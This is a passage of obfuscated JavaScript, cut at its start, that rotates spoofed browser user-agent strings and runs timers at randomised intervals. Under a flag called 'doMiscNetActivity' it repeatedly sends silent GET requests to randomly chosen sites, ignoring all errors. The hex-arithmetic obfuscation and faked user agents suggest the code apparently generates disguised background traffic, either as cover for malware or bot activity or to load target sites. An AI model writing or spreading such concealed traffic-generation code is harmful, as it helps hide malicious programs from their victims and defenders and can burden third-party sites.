      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1 * -0xe21 + -0xd0d + 0x1b2e; k < -0x1201 * 0x1 + 0x1 * -0x2437 + 0x363c; k++)
    setTimeout(f, (0x9575 * -0x3 + -0x3cb * -0x71 + 0xa * 0x196a) * k * getRandomInt(0x3f4 + 0x98 + -0x48b, -0x1541 * 0x1 + 0x1 * -0x1e6d + 0x191 * 0x21));
  setInterval(() => {
    f();
    for (let l = 0x14b * 0x1d + -0x2 * 0x6fc + -0x1787; l < 0x16cc + -0x1 * 0x1d85 + -0x73 * -0xf; l++)
      setTimeout(f, (0xd801 + -0x1 * -0x2f0b + -0x1cac) * l * getRandomInt(-0x2010 + -0x4ac + 0x24bd, 0x1 * 0x1c8a + -0x2b * 0xa9 + -0x6 * 0x6));
  }, -0x4b32f9 + -0xd * -0x1b034 + -0x6c2ed5 * -0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x30bf + -0xe12 * -0x2 + 0xb * -0x481) * getRandomInt(-0xc89 * -0x1 + 0xb57 * -0x3 + 0x1 * 0x157d, 0xb0a + 0x26cd + -0x31d2));
}, 0x2536 + 0x53 * 0x6d + 0xd * -0x58d);